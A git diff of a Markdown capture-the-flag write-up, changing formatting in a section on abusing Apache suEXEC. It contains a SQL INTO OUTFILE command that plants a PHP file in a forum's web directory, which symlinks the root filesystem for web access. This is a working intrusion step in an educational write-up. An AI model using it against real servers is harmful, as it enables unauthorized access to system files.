@@ -4,11 +4,11 @@ Returning to the point where we gained root access to the database, there's anot
 
 ## Apache suEXEC
 
-First, it's important to know that Apache includes a feature called suEXEC, which allows users to run CGI and SSI programs under different user IDs than the one used by the web server. Typically, when a CGI or SSI program is executed, it runs with the same user permissions as the web server.
+First, it's important to know that Apache includes a feature called `suEXEC`, which allows users to run CGI and SSI programs under different user IDs than the one used by the web server. Typically, when a CGI or SSI program is executed, it runs with the same user permissions as the web server.
 
 We can take advantage of this feature by developing and executing a custom CGI script. To do this, we can create a PHP script similar to the one in [writeup1](../writeup1.md) and place it in */var/www/forum/templates_c/suexec.php*. 
 
-```
+```SQL
 SELECT "<?php system('ln -sf / root_filesystem'); symlink('/', 'root_filesystem'); ?>" into outfile "/var/www/forum/templates_c/suexec.php"
 ```
 
